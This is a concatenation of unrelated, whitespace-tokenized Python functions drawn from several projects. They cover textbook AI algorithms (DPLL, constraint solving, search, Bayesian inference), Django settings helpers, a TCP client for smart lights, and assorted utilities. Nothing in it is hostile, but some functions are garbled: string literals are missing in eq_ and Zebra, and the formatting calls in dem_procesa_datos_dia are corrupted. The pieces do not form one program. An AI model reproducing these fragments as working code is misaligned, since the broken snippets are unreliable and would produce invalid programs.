def print_parents ( self ) : if self . gender == female : title = 'Daughter' elif self . gender == male : title = 'Son' else : title = 'Child' p1 = self . parents [ 0 ] p2 = self . parents [ 1 ] template = '%s of %s, the %s, and %s, the %s.' print ( template % ( title , p1 . name , p1 . epithet , p2 . name , p2 . epithet ) )
def format_seconds ( self , n_seconds ) : func = self . ok if n_seconds >= 60 : n_minutes , n_seconds = divmod ( n_seconds , 60 ) return "%s minutes %s seconds" % ( func ( "%d" % n_minutes ) , func ( "%.3f" % n_seconds ) ) else : return "%s seconds" % ( func ( "%.3f" % n_seconds ) )
def ppdict ( dict_to_print , br = '\n' , html = False , key_align = 'l' , sort_keys = True , key_preffix = '' , key_suffix = '' , value_prefix = '' , value_suffix = '' , left_margin = 3 , indent = 2 ) : if dict_to_print : if sort_keys : dic = dict_to_print . copy ( ) keys = list ( dic . keys ( ) ) keys . sort ( ) dict_to_print = OrderedDict ( ) for k in keys : dict_to_print [ k ] = dic [ k ] tmp = [ '{' ] ks = [ type ( x ) == str and "'%s'" % x or x for x in dict_to_print . keys ( ) ] vs = [ type ( x ) == str and "'%s'" % x or x for x in dict_to_print . values ( ) ] max_key_len = max ( [ len ( str ( x ) ) for x in ks ] ) for i in range ( len ( ks ) ) : k = { 1 : str ( ks [ i ] ) . ljust ( max_key_len ) , key_align == 'r' : str ( ks [ i ] ) . rjust ( max_key_len ) } [ 1 ] v = vs [ i ] tmp . append ( ' ' * indent + '{}{}{}:{}{}{},' . format ( key_preffix , k , key_suffix , value_prefix , v , value_suffix ) ) tmp [ - 1 ] = tmp [ - 1 ] [ : - 1 ] # remove the ',' in the last item tmp . append ( '}' ) if left_margin : tmp = [ ' ' * left_margin + x for x in tmp ] if html : return '<code>{}</code>' . format ( br . join ( tmp ) . replace ( ' ' , '&nbsp;' ) ) else : return br . join ( tmp ) else : return '{}'
def eq_ ( result , expected , msg = None ) : params = { 'expected' : expected , 'result' : result } aka = % params default_msg = % params if ( ( repr ( result ) != six . text_type ( result ) ) or ( repr ( expected ) != six . text_type ( expected ) ) ) : default_msg += aka assertion_msg = msg or default_msg # This assert will bubble up to Nose's failure handling, which at some # point calls explicit str() - which will UnicodeDecodeError on any non # ASCII text. # To work around this, we make sure Unicode strings become bytestrings # beforehand, with explicit encode. if isinstance ( assertion_msg , six . text_type ) : assertion_msg = assertion_msg . encode ( 'utf-8' ) assert result == expected , assertion_msg
def dem_procesa_datos_dia ( key_day , response ) : dfs_import , df_import , dfs_maxmin , hay_errores = [ ] , None , [ ] , 0 for r in response : tipo_datos , data = _extract_func_json_data ( r ) if tipo_datos is not None : if ( 'IND_MaxMin' in tipo_datos ) and data : df_import = _import_daily_max_min ( data ) dfs_maxmin . append ( df_import ) elif data : df_import = _import_json_ts_data ( data ) dfs_import . append ( df_import ) if tipo_datos is None or df_import is None : hay_errores += 1 if hay_errores == 4 : # No hay nada, salida temprana sin retry: print_redb ( '** No hay datos para el da {}!'. f ormat( k ey_day) )  return None , - 2 else : # if hay_errores < 3: # TODO formar datos incompletos!! (max-min con NaN's, etc.) data_import = { } if dfs_import : data_import [ KEYS_DATA_DEM [ 0 ] ] = dfs_import [ 0 ] . join ( dfs_import [ 1 ] ) if len ( dfs_maxmin ) == 2 : data_import [ KEYS_DATA_DEM [ 1 ] ] = dfs_maxmin [ 0 ] . join ( dfs_maxmin [ 1 ] ) elif dfs_maxmin : data_import [ KEYS_DATA_DEM [ 1 ] ] = dfs_maxmin [ 0 ] if not data_import : print_err ( 'DA: {} -> # ERRORES: {}'. f ormat( k ey_day,   ay_errores) )  return None , - 2 return data_import , 0
def _compress ( self , input_str ) : compressed_bits = cStringIO . StringIO ( ) f = gzip . GzipFile ( fileobj = compressed_bits , mode = 'wb' ) f . write ( input_str ) f . close ( ) return compressed_bits . getvalue ( )
def registerGoodClass ( self , class_ ) : # Class itself added to "good" list self . _valid_classes . append ( class_ ) # Recurse into any inner classes for name , cls in class_members ( class_ ) : if self . isValidClass ( cls ) : self . registerGoodClass ( cls )
def get_resample_data ( self ) : if self . data is not None : if self . _pvpc_mean_daily is None : self . _pvpc_mean_daily = self . data [ 'data' ] . resample ( 'D' ) . mean ( ) if self . _pvpc_mean_monthly is None : self . _pvpc_mean_monthly = self . data [ 'data' ] . resample ( 'MS' ) . mean ( ) return self . _pvpc_mean_daily , self . _pvpc_mean_monthly
def move_dot ( self ) : return self . __class__ ( self . production , self . pos + 1 , self . lookahead )
def first ( self , symbols ) : ret = set ( ) if EPSILON in symbols : return set ( [ EPSILON ] ) for symbol in symbols : ret |= self . _first [ symbol ] - set ( [ EPSILON ] ) if EPSILON not in self . _first [ symbol ] : break else : ret . add ( EPSILON ) return ret
def initial_closure ( self ) : first_rule = DottedRule ( self . start , 0 , END_OF_INPUT ) return self . closure ( [ first_rule ] )
def parse_definite_clause ( s ) : assert is_definite_clause ( s ) if is_symbol ( s . op ) : return [ ] , s else : antecedent , consequent = s . args return conjuncts ( antecedent ) , consequent
def tt_check_all ( kb , alpha , symbols , model ) : if not symbols : if pl_true ( kb , model ) : result = pl_true ( alpha , model ) assert result in ( True , False ) return result else : return True else : P , rest = symbols [ 0 ] , symbols [ 1 : ] return ( tt_check_all ( kb , alpha , rest , extend ( model , P , True ) ) and tt_check_all ( kb , alpha , rest , extend ( model , P , False ) ) )
def prop_symbols ( x ) : if not isinstance ( x , Expr ) : return [ ] elif is_prop_symbol ( x . op ) : return [ x ] else : return list ( set ( symbol for arg in x . args for symbol in prop_symbols ( arg ) ) )
def dpll ( clauses , symbols , model ) : unknown_clauses = [ ] ## clauses with an unknown truth value for c in clauses : val = pl_true ( c , model ) if val == False : return False if val != True : unknown_clauses . append ( c ) if not unknown_clauses : return model P , value = find_pure_symbol ( symbols , unknown_clauses ) if P : return dpll ( clauses , removeall ( P , symbols ) , extend ( model , P , value ) ) P , value = find_unit_clause ( clauses , model ) if P : return dpll ( clauses , removeall ( P , symbols ) , extend ( model , P , value ) ) P , symbols = symbols [ 0 ] , symbols [ 1 : ] return ( dpll ( clauses , symbols , extend ( model , P , True ) ) or dpll ( clauses , symbols , extend ( model , P , False ) ) )
def is_variable ( x ) : return isinstance ( x , Expr ) and not x . args and is_var_symbol ( x . op )
def retract ( self , sentence ) : for c in conjuncts ( to_cnf ( sentence ) ) : if c in self . clauses : self . clauses . remove ( c )
def refresh ( self ) : # `values_list('name', 'value')` doesn't work because `value` is not a # setting (base class) field, it's a setting value (subclass) field. So # we have to get real instances. args = [ ( obj . name , obj . value ) for obj in self . queryset . all ( ) ] super ( SettingDict , self ) . update ( args ) self . empty_cache = False
def utility ( self , state , player ) : return if_ ( player == 'X' , state . utility , - state . utility )
def compute_utility ( self , board , move , player ) : if ( self . k_in_row ( board , move , player , ( 0 , 1 ) ) or self . k_in_row ( board , move , player , ( 1 , 0 ) ) or self . k_in_row ( board , move , player , ( 1 , - 1 ) ) or self . k_in_row ( board , move , player , ( 1 , 1 ) ) ) : return if_ ( player == 'X' , + 1 , - 1 ) else : return 0
def k_in_row ( self , board , move , player , ( delta_x , delta_y ) ) : x , y = move n = 0 # n is number of moves in row while board . get ( ( x , y ) ) == player : n += 1 x , y = x + delta_x , y + delta_y x , y = move while board . get ( ( x , y ) ) == player : n += 1 x , y = x - delta_x , y - delta_y n -= 1 # Because we counted move itself twice return n >= self . k
def weighted_sampler ( seq , weights ) : totals = [ ] for w in weights : totals . append ( w + totals [ - 1 ] if totals else w ) return lambda : seq [ bisect . bisect ( totals , random . uniform ( 0 , totals [ - 1 ] ) ) ]
def name ( object ) : return ( getattr ( object , 'name' , 0 ) or getattr ( object , '__name__' , 0 ) or getattr ( getattr ( object , '__class__' , 0 ) , '__name__' , 0 ) or str ( object ) )
def AIMAFile ( components , mode = 'r' ) : import utils dir = os . path . dirname ( utils . __file__ ) return open ( apply ( os . path . join , [ dir ] + components ) , mode )
def information_content ( values ) : probabilities = normalize ( removeall ( 0 , values ) ) return sum ( - p * log2 ( p ) for p in probabilities )
def NeuralNetLearner ( dataset , sizes ) : activations = map ( lambda n : [ 0.0 for i in range ( n ) ] , sizes ) weights = [ ] def predict ( example ) : unimplemented ( ) return predict
def EnsembleLearner ( learners ) : def train ( dataset ) : predictors = [ learner ( dataset ) for learner in learners ] def predict ( example ) : return mode ( predictor ( example ) for predictor in predictors ) return predict return train
def WeightedMajority ( predictors , weights ) : def predict ( example ) : return weighted_mode ( ( predictor ( example ) for predictor in predictors ) , weights ) return predict
def replicated_dataset ( dataset , weights , n = None ) : n = n or len ( dataset . examples ) result = copy . copy ( dataset ) result . examples = weighted_replicate ( dataset . examples , weights , n ) return result
def leave1out ( learner , dataset ) : return cross_validation ( learner , dataset , k = len ( dataset . examples ) )
def SyntheticRestaurant ( n = 20 ) : def gen ( ) : example = map ( random . choice , restaurant . values ) example [ restaurant . target ] = Fig [ 18 , 2 ] ( example ) return example return RestaurantDataSet ( [ gen ( ) for i in range ( n ) ] )
def check_me ( self ) : assert len ( self . attrnames ) == len ( self . attrs ) assert self . target in self . attrs assert self . target not in self . inputs assert set ( self . inputs ) . issubset ( set ( self . attrs ) ) map ( self . check_example , self . examples )
def add_example ( self , example ) : self . check_example ( example ) self . examples . append ( example )
def check_example ( self , example ) : if self . values : for a in self . attrs : if example [ a ] not in self . values [ a ] : raise ValueError ( 'Bad value %s for attribute %s in %s' % ( example [ a ] , self . attrnames [ a ] , example ) )
def attrnum ( self , attr ) : if attr < 0 : return len ( self . attrs ) + attr elif isinstance ( attr , str ) : return self . attrnames . index ( attr ) else : return attr
def sanitize ( self , example ) : return [ attr_i if i in self . inputs else None for i , attr_i in enumerate ( example ) ]
def add ( self , o ) : self . smooth_for ( o ) self . dictionary [ o ] += 1 self . n_obs += 1 self . sampler = None
def sample ( self ) : if self . sampler is None : self . sampler = weighted_sampler ( self . dictionary . keys ( ) , self . dictionary . values ( ) ) return self . sampler ( )
def revise ( csp , Xi , Xj , removals ) : revised = False for x in csp . curr_domains [ Xi ] [ : ] : # If Xi=x conflicts with Xj=y for every possible y, eliminate Xi=x if every ( lambda y : not csp . constraints ( Xi , x , Xj , y ) , csp . curr_domains [ Xj ] ) : csp . prune ( Xi , x , removals ) revised = True return revised
def mrv ( assignment , csp ) : return argmin_random_tie ( [ v for v in csp . vars if v not in assignment ] , lambda var : num_legal_values ( csp , var , assignment ) )
def lcv ( var , assignment , csp ) : return sorted ( csp . choices ( var ) , key = lambda val : csp . nconflicts ( var , val , assignment ) )
def forward_checking ( csp , var , value , assignment , removals ) : for B in csp . neighbors [ var ] : if B not in assignment : for b in csp . curr_domains [ B ] [ : ] : if not csp . constraints ( var , value , B , b ) : csp . prune ( B , b , removals ) if not csp . curr_domains [ B ] : return False return True
def mac ( csp , var , value , assignment , removals ) : return AC3 ( csp , [ ( X , var ) for X in csp . neighbors [ var ] ] , removals )
def min_conflicts ( csp , max_steps = 100000 ) : # Generate a complete assignment for all vars (probably with conflicts) csp . current = current = { } for var in csp . vars : val = min_conflicts_value ( csp , var , current ) csp . assign ( var , val , current ) # Now repeatedly choose a random conflicted variable and change it for i in range ( max_steps ) : conflicted = csp . conflicted_vars ( current ) if not conflicted : return current var = random . choice ( conflicted ) val = min_conflicts_value ( csp , var , current ) csp . assign ( var , val , current ) return None
def Zebra ( ) : Colors = 'Red Yellow Blue Green Ivory' . split ( ) Pets = 'Dog Fox Snails Horse Zebra' . split ( ) Drinks = 'OJ Tea Coffee Milk Water' . split ( ) Countries = 'Englishman Spaniard Norwegian Ukranian Japanese' . split ( ) Smokes = 'Kools Chesterfields Winston LuckyStrike Parliaments' . split ( ) vars = Colors + Pets + Drinks + Countries + Smokes domains = { } for var in vars : domains [ var ] = range ( 1 , 6 ) domains [ 'Norwegian' ] = [ 1 ] domains [ 'Milk' ] = [ 3 ] neighbors = parse_neighbors ( , vars ) for type in [ Colors , Pets , Drinks , Countries , Smokes ] : for A in type : for B in type : if A != B : if B not in neighbors [ A ] : neighbors [ A ] . append ( B ) if A not in neighbors [ B ] : neighbors [ B ] . append ( A ) def zebra_constraint ( A , a , B , b , recurse = 0 ) : same = ( a == b ) next_to = abs ( a - b ) == 1 if A == 'Englishman' and B == 'Red' : return same if A == 'Spaniard' and B == 'Dog' : return same if A == 'Chesterfields' and B == 'Fox' : return next_to if A == 'Norwegian' and B == 'Blue' : return next_to if A == 'Kools' and B == 'Yellow' : return same if A == 'Winston' and B == 'Snails' : return same if A == 'LuckyStrike' and B == 'OJ' : return same if A == 'Ukranian' and B == 'Tea' : return same if A == 'Japanese' and B == 'Parliaments' : return same if A == 'Kools' and B == 'Horse' : return next_to if A == 'Coffee' and B == 'Green' : return same if A == 'Green' and B == 'Ivory' : return ( a - 1 ) == b if recurse == 0 : return zebra_constraint ( B , b , A , a , 1 ) if ( ( A in Colors and B in Colors ) or ( A in Pets and B in Pets ) or ( A in Drinks and B in Drinks ) or ( A in Countries and B in Countries ) or ( A in Smokes and B in Smokes ) ) : return not same raise 'error' return CSP ( vars , domains , neighbors , zebra_constraint )
def nconflicts ( self , var , val , assignment ) : # Subclasses may implement this more efficiently def conflict ( var2 ) : return ( var2 in assignment and not self . constraints ( var , val , var2 , assignment [ var2 ] ) ) return count_if ( conflict , self . neighbors [ var ] )
def suppose ( self , var , value ) : self . support_pruning ( ) removals = [ ( var , a ) for a in self . curr_domains [ var ] if a != value ] self . curr_domains [ var ] = [ value ] return removals
def prune ( self , var , value , removals ) : self . curr_domains [ var ] . remove ( value ) if removals is not None : removals . append ( ( var , value ) )
def infer_assignment ( self ) : self . support_pruning ( ) return dict ( ( v , self . curr_domains [ v ] [ 0 ] ) for v in self . vars if 1 == len ( self . curr_domains [ v ] ) )
def restore ( self , removals ) : for B , b in removals : self . curr_domains [ B ] . append ( b )
def conflicted_vars ( self , current ) : return [ var for var in self . vars if self . nconflicts ( var , current [ var ] , current ) > 0 ]
def assign ( self , var , val , assignment ) : oldval = assignment . get ( var , None ) if val != oldval : if oldval is not None : # Remove old val if there was one self . record_conflict ( assignment , var , oldval , - 1 ) self . record_conflict ( assignment , var , val , + 1 ) CSP . assign ( self , var , val , assignment )
def record_conflict ( self , assignment , var , val , delta ) : n = len ( self . vars ) self . rows [ val ] += delta self . downs [ var + val ] += delta self . ups [ var - val + n - 1 ] += delta
def encode ( plaintext , code ) : from string import maketrans trans = maketrans ( alphabet + alphabet . upper ( ) , code + code . upper ( ) ) return plaintext . translate ( trans )
def index_collection ( self , filenames ) : for filename in filenames : self . index_document ( open ( filename ) . read ( ) , filename )
def index_document ( self , text , url ) : ## For now, use first line for title title = text [ : text . index ( '\n' ) ] . strip ( ) docwords = words ( text ) docid = len ( self . documents ) self . documents . append ( Document ( title , url , len ( docwords ) ) ) for word in docwords : if word not in self . stopwords : self . index [ word ] [ docid ] += 1
def score ( self , word , docid ) : ## There are many options; here we take a very simple approach return ( math . log ( 1 + self . index [ word ] [ docid ] ) / math . log ( 1 + self . documents [ docid ] . nwords ) )
def present ( self , results ) : for ( score , d ) in results : doc = self . documents [ d ] print ( "%5.2f|%25s | %s" % ( 100 * score , doc . url , doc . title [ : 45 ] . expandtabs ( ) ) )
def present_results ( self , query_text , n = 10 ) : self . present ( self . query ( query_text , n ) )
def score ( self , plaintext ) : s = 1.0 for bi in bigrams ( plaintext ) : s = s * self . P2 [ bi ] return s
def decode ( self , ciphertext ) : self . ciphertext = ciphertext problem = PermutationDecoderProblem ( decoder = self ) return search . best_first_tree_search ( problem , lambda node : self . score ( node . state ) )
def get_value ( self , context , default ) : if default is None : settings = self . setting_model . objects . as_dict ( ) else : settings = self . setting_model . objects . as_dict ( default = default ) return settings
def get_value ( self , context , name , default ) : settings = self . setting_model . objects . filter ( name = name ) if default is None : settings = settings . as_dict ( ) else : settings = settings . as_dict ( default = default ) value = settings [ name ] return value
def render_tag ( self , context , name , nodelist ) : # Use `try` and `except` instead of `setdefault()` so we can skip # rendering the nodelist when the setting already exists. settings = self . setting_model . objects . filter ( name = name ) . as_dict ( ) try : value = settings [ name ] except KeyError : value = settings [ name ] = nodelist . render ( context ) return value
def expected_utility ( a , s , U , mdp ) : return sum ( [ p * U [ s1 ] for ( p , s1 ) in mdp . T ( s , a ) ] )
def go ( self , state , direction ) : state1 = vector_add ( state , direction ) return if_ ( state1 in self . states , state1 , state )
def as_dict ( self , default = None ) : settings = SettingDict ( queryset = self , default = default ) return settings
def create ( self , name , value ) : if value is None : raise ValueError ( 'Setting value cannot be `None`.' ) model = Setting . get_model_for_value ( value ) # Call `create()` method on the super class to avoid recursion. obj = super ( SettingQuerySet , model . objects . all ( ) ) . create ( name = name , value = value ) return obj
def exp_schedule ( k = 20 , lam = 0.005 , limit = 100 ) : return lambda t : if_ ( t < limit , k * math . exp ( - lam * t ) , 0 )
def print_boggle ( board ) : n2 = len ( board ) n = exact_sqrt ( n2 ) for i in range ( n2 ) : if i % n == 0 and i > 0 : print if board [ i ] == 'Q' : print 'Qu' , else : print str ( board [ i ] ) + ' ' , print
def exact_sqrt ( n2 ) : n = int ( math . sqrt ( n2 ) ) assert n * n == n2 return n
def expand ( self , problem ) : return [ self . child_node ( problem , action ) for action in problem . actions ( self . state ) ]
def child_node ( self , problem , action ) : next = problem . result ( self . state , action ) return Node ( next , self , action , problem . path_cost ( self . path_cost , self . state , action , next ) )
def path ( self ) : node , path_back = self , [ ] while node : path_back . append ( node ) node = node . parent return list ( reversed ( path_back ) )
def mate ( self , other ) : c = random . randrange ( len ( self . genes ) ) return self . __class__ ( self . genes [ : c ] + other . genes [ c : ] )
def make_undirected ( self ) : for a in self . dict . keys ( ) : for ( b , distance ) in self . dict [ a ] . items ( ) : self . connect1 ( b , a , distance )
def connect1 ( self , A , B , distance ) : self . dict . setdefault ( A , { } ) [ B ] = distance
def h ( self , node ) : locs = getattr ( self . graph , 'locations' , None ) if locs : return int ( distance ( locs [ node . state ] , locs [ self . goal ] ) ) else : return infinity
def actions ( self , state ) : if state [ - 1 ] is not None : return [ ] # All columns filled; no successors else : col = state . index ( None ) return [ row for row in range ( self . N ) if not self . conflicted ( state , row , col ) ]
def result ( self , state , row ) : col = state . index ( None ) new = state [ : ] new [ col ] = row return new
def set_board ( self , board = None ) : if board is None : board = random_boggle ( ) self . board = board self . neighbors = boggle_neighbors ( len ( board ) ) self . found = { } for i in range ( len ( board ) ) : lo , hi = self . wordlist . bounds [ board [ i ] ] self . find ( lo , hi , i , [ ] , '' ) return self
def score ( self ) : return sum ( [ self . scores [ len ( w ) ] for w in self . words ( ) ] )
def ModelBasedVacuumAgent ( ) : model = { loc_A : None , loc_B : None } def program ( ( location , status ) ) : "Same as ReflexVacuumAgent, except if everything is clean, do NoOp." model [ location ] = status ## Update the model here if model [ loc_A ] == model [ loc_B ] == 'Clean' : return 'NoOp' elif status == 'Dirty' : return 'Suck' elif location == loc_A : return 'Right' elif location == loc_B : return 'Left' return Agent ( program )
def run ( self , steps = 1000 ) : for step in range ( steps ) : if self . is_done ( ) : return self . step ( )
def list_things_at ( self , location , tclass = Thing ) : return [ thing for thing in self . things if thing . location == location and isinstance ( thing , tclass ) ]
def delete_thing ( self , thing ) : try : self . things . remove ( thing ) except ValueError , e : print e print "  in Environment delete_thing" print "  Thing to be removed: %s at %s" % ( thing , thing . location ) print "  from list: %s" % [ ( thing , thing . location ) for thing in self . things ] if thing in self . agents : self . agents . remove ( thing )
def things_near ( self , location , radius = None ) : if radius is None : radius = self . perceptible_distance radius2 = radius * radius return [ thing for thing in self . things if distance2 ( location , thing . location ) <= radius2 ]
def percept ( self , agent ) : return [ self . thing_percept ( thing , agent ) for thing in self . things_near ( agent . location ) ]
def move_to ( self , thing , destination ) : thing . bump = self . some_things_at ( destination , Obstacle ) if not thing . bump : thing . location = destination for o in self . observers : o . thing_moved ( thing )
def add_walls ( self ) : for x in range ( self . width ) : self . add_thing ( Wall ( ) , ( x , 0 ) ) self . add_thing ( Wall ( ) , ( x , self . height - 1 ) ) for y in range ( self . height ) : self . add_thing ( Wall ( ) , ( 0 , y ) ) self . add_thing ( Wall ( ) , ( self . width - 1 , y ) )
def add_edge ( self , edge ) : start , end , lhs , found , expects = edge if edge not in self . chart [ end ] : self . chart [ end ] . append ( edge ) if self . trace : print '%10s: added %s' % ( caller ( 2 ) , edge ) if not expects : self . extender ( edge ) else : self . predictor ( edge )
def scanner ( self , j , word ) : for ( i , j , A , alpha , Bb ) in self . chart [ j ] : if Bb and self . grammar . isa ( word , Bb [ 0 ] ) : self . add_edge ( [ i , j + 1 , A , alpha + [ ( Bb [ 0 ] , word ) ] , Bb [ 1 : ] ] )
def predictor ( self , ( i , j , A , alpha , Bb ) ) : B = Bb [ 0 ] if B in self . grammar . rules : for rhs in self . grammar . rewrites_for ( B ) : self . add_edge ( [ j , j , B , [ ] , rhs ] )
def extender ( self , edge ) : ( j , k , B , _ , _ ) = edge for ( i , j , A , alpha , B1b ) in self . chart [ j ] : if B1b and B == B1b [ 0 ] : self . add_edge ( [ i , k , A , alpha + [ edge ] , B1b [ 1 : ] ] )
def sum_out ( var , factors , bn ) : result , var_factors = [ ] , [ ] for f in factors : ( var_factors if var in f . vars else result ) . append ( f ) result . append ( pointwise_product ( var_factors , bn ) . sum_out ( var , bn ) ) return result
def all_events ( vars , bn , e ) : if not vars : yield e else : X , rest = vars [ 0 ] , vars [ 1 : ] for e1 in all_events ( rest , bn , e ) : for x in bn . variable_values ( X ) : yield extend ( e1 , X , x )
def consistent_with ( event , evidence ) : return every ( lambda ( k , v ) : evidence . get ( k , v ) == v , event . items ( ) )
def pointwise_product ( self , other , bn ) : vars = list ( set ( self . vars ) | set ( other . vars ) ) cpt = dict ( ( event_values ( e , vars ) , self . p ( e ) * other . p ( e ) ) for e in all_events ( vars , bn , { } ) ) return Factor ( vars , cpt )
def sum_out ( self , var , bn ) : vars = [ X for X in self . vars if X != var ] cpt = dict ( ( event_values ( e , vars ) , sum ( self . p ( extend ( e , var , val ) ) for val in bn . variable_values ( var ) ) ) for e in all_events ( vars , bn , { } ) ) return Factor ( vars , cpt )
def normalize ( self ) : assert len ( self . vars ) == 1 return ProbDist ( self . vars [ 0 ] , dict ( ( k , v ) for ( ( k , ) , v ) in self . cpt . items ( ) ) )
def brightness ( level = 100 , group = 0 ) : if level not in range ( 0 , 101 ) : raise Exception ( "Brightness must be value between 0 and 100" ) b = int ( floor ( level / 4.0 ) + 2 ) #lights want values 2-27 return ( COMMANDS [ 'ON' ] [ group ] , Command ( 0x4E , b ) )
def brightness ( level = 100 , group = 0 ) : if level not in range ( 0 , 101 ) : raise Exception ( "Brightness must be value between 0 and 100" ) b = int ( floor ( level / 10.0 ) ) #lights have 10 levels of brightness commands = list ( darkest ( group ) ) for i in range ( 0 , b ) : commands . append ( COMMANDS [ 'BRIGHTER' ] ) return tuple ( commands )
def warmness ( level = 100 , group = 0 ) : if level not in range ( 0 , 101 ) : raise Exception ( "Warmness must be value between 0 and 100" ) b = int ( floor ( level / 10.0 ) ) #lights have 10 levels of warmness commands = list ( coolest ( group ) ) for i in range ( 0 , b ) : commands . append ( COMMANDS [ 'WARMER' ] ) return tuple ( commands )
def getpassword ( prompt = "Password: " ) : fd = sys . stdin . fileno ( ) old = termios . tcgetattr ( fd ) new = termios . tcgetattr ( fd ) new [ 3 ] &= ~ termios . ECHO # lflags try : termios . tcsetattr ( fd , termios . TCSADRAIN , new ) passwd = raw_input ( prompt ) finally : termios . tcsetattr ( fd , termios . TCSADRAIN , old ) return passwd
def getch ( ) : try : termios . tcsetattr ( _fd , termios . TCSANOW , _new_settings ) ch = sys . stdin . read ( 1 ) finally : termios . tcsetattr ( _fd , termios . TCSADRAIN , _old_settings ) return ch
def format ( self , record ) : try : record . message = record . getMessage ( ) except TypeError : # if error during msg = msg % self.args if record . args : if isinstance ( record . args , collections . Mapping ) : record . message = record . msg . format ( * * record . args ) else : record . message = record . msg . format ( record . args ) self . _fmt = self . getfmt ( record . levelname ) if self . usesTime ( ) : record . asctime = self . formatTime ( record , self . datefmt ) s = self . _fmt . format ( * * record . __dict__ ) if record . exc_info : # Cache the traceback text to avoid converting it multiple times # (it's constant anyway) if not record . exc_text : record . exc_text = self . formatException ( record . exc_info ) if record . exc_text : if s [ - 1 : ] != '\n' : s += '\n' try : s = s + record . exc_text except UnicodeError : s = s + record . exc_text . decode ( sys . getfilesystemencoding ( ) , 'replace' ) return s
def connect ( self ) : try : self . _socket = socket . socket ( socket . AF_INET , socket . SOCK_STREAM ) self . _socket . settimeout ( TIMEOUT_SECONDS ) self . _socket . connect ( ( self . _ip , self . _port ) ) _LOGGER . debug ( "Successfully created Hub at %s:%s :)" , self . _ip , self . _port ) except socket . error as error : _LOGGER . error ( "Error creating Hub: %s :(" , error ) self . _socket . close ( )
def send_command ( self , command ) : # use lock to make TCP send/receive thread safe with self . _lock : try : self . _socket . send ( command . encode ( "utf8" ) ) result = self . receive ( ) # hub may send "status"/"new" messages that should be ignored while result . startswith ( "S" ) or result . startswith ( "NEW" ) : _LOGGER . debug ( "!Got response: %s" , result ) result = self . receive ( ) _LOGGER . debug ( "Received: %s" , result ) return result except socket . error as error : _LOGGER . error ( "Error sending command: %s" , error ) # try re-connecting socket self . connect ( ) return ""
def receive ( self ) : try : buffer = self . _socket . recv ( BUFFER_SIZE ) except socket . timeout as error : # Something is wrong, assume it's offline temporarily _LOGGER . error ( "Error receiving: %s" , error ) # self._socket.close() return "" # Read until a newline or timeout buffering = True response = '' while buffering : if '\n' in buffer . decode ( "utf8" ) : response = buffer . decode ( "utf8" ) . split ( '\n' ) [ 0 ] buffering = False else : try : more = self . _socket . recv ( BUFFER_SIZE ) except socket . timeout : more = None if not more : buffering = False response = buffer . decode ( "utf8" ) else : buffer += more return response
def get_data ( self ) : response = self . send_command ( GET_LIGHTS_COMMAND ) _LOGGER . debug ( "get_data response: %s" , repr ( response ) ) if not response : _LOGGER . debug ( "Empty response: %s" , response ) return { } response = response . strip ( ) # Check string before splitting (avoid IndexError if malformed) if not ( response . startswith ( "GLB" ) and response . endswith ( ";" ) ) : _LOGGER . debug ( "Invalid response: %s" , repr ( response ) ) return { } # deconstruct response string into light data. Example data: # GLB 143E,1,1,25,255,255,255,0,0;287B,1,1,22,255,255,255,0,0;\r\n response = response [ 4 : - 3 ] # strip start (GLB) and end (;\r\n) light_strings = response . split ( ';' ) light_data_by_id = { } for light_string in light_strings : values = light_string . split ( ',' ) try : light_data_by_id [ values [ 0 ] ] = [ int ( values [ 2 ] ) , int ( values [ 4 ] ) , int ( values [ 5 ] ) , int ( values [ 6 ] ) , int ( values [ 7 ] ) ] except ValueError as error : _LOGGER . error ( "Error %s: %s (%s)" , error , values , response ) except IndexError as error : _LOGGER . error ( "Error %s: %s (%s)" , error , values , response ) return light_data_by_id
def get_lights ( self ) : # Throttle updates. Use cached data if within UPDATE_INTERVAL_SECONDS now = datetime . datetime . now ( ) if ( now - self . _last_updated ) < datetime . timedelta ( seconds = UPDATE_INTERVAL_SECONDS ) : # _LOGGER.debug("Using cached light data") return self . _bulbs else : self . _last_updated = now light_data = self . get_data ( ) _LOGGER . debug ( "got: %s" , light_data ) if not light_data : return [ ] if self . _bulbs : # Bulbs already created, just update values for bulb in self . _bulbs : # use the values for the bulb with the correct ID try : values = light_data [ bulb . zid ] bulb . _online , bulb . _red , bulb . _green , bulb . _blue , bulb . _level = values except KeyError : pass else : for light_id in light_data : self . _bulbs . append ( Bulb ( self , light_id , * light_data [ light_id ] ) ) # return a list of Bulb objects return self . _bulbs
def set_brightness ( self , brightness ) : command = "C {},,,,{},\r\n" . format ( self . _zid , brightness ) response = self . _hub . send_command ( command ) _LOGGER . debug ( "Set brightness %s: %s" , repr ( command ) , response ) return response
def set_all ( self , red , green , blue , brightness ) : command = "C {},{},{},{},{},\r\n" . format ( self . _zid , red , green , blue , brightness ) response = self . _hub . send_command ( command ) _LOGGER . debug ( "Set all %s: %s" , repr ( command ) , response ) return response
def update ( self ) : bulbs = self . _hub . get_lights ( ) if not bulbs : _LOGGER . debug ( "%s is offline, send command failed" , self . _zid ) self . _online = False
def readtxt ( filepath ) : with open ( filepath , 'rt' ) as f : lines = f . readlines ( ) return '' . join ( lines )
def modulename ( cls , depth = 1 ) : depth += cls . extra_depth frame = sys . _getframe ( depth ) return frame . f_globals [ '__name__' ]
def snoise2d ( size , z = 0.0 , scale = 0.05 , octaves = 1 , persistence = 0.25 , lacunarity = 2.0 ) : import noise data = np . empty ( size , dtype = 'float32' ) for y in range ( size [ 0 ] ) : for x in range ( size [ 1 ] ) : v = noise . snoise3 ( x * scale , y * scale , z , octaves = octaves , persistence = persistence , lacunarity = lacunarity ) data [ x , y ] = v data = data * 0.5 + 0.5 if __debug__ : assert data . min ( ) >= 0. and data . max ( ) <= 1.0 return data
def guess_package_path ( searchfrom ) : from snipy . io import fileutil current = searchfrom + '/' init_found = False pack_found = False while not init_found and current != '/' : current = os . path . dirname ( current ) initfile = os . path . join ( current , '__init__.py' ) init_found = os . path . exists ( initfile ) if not init_found : # search for breadth searchfrom = dirname ( searchfrom ) for folder in fileutil . listfolder ( searchfrom ) : current = os . path . join ( searchfrom , folder ) initfile = os . path . join ( current , '__init__.py' ) init_found = os . path . exists ( initfile ) if init_found : break while init_found : current = os . path . dirname ( current ) initfile = os . path . join ( current , '__init__.py' ) init_found = os . path . exists ( initfile ) pack_found = not init_found return current if pack_found else None
def find_package_path ( searchfrom ) : current = searchfrom + '/' init_found = False pack_found = False while not init_found and current != '/' : current = os . path . dirname ( current ) initfile = os . path . join ( current , '__init__.py' ) init_found = os . path . exists ( initfile ) while init_found : current = os . path . dirname ( current ) initfile = os . path . join ( current , '__init__.py' ) init_found = os . path . exists ( initfile ) pack_found = not init_found return current if pack_found else None
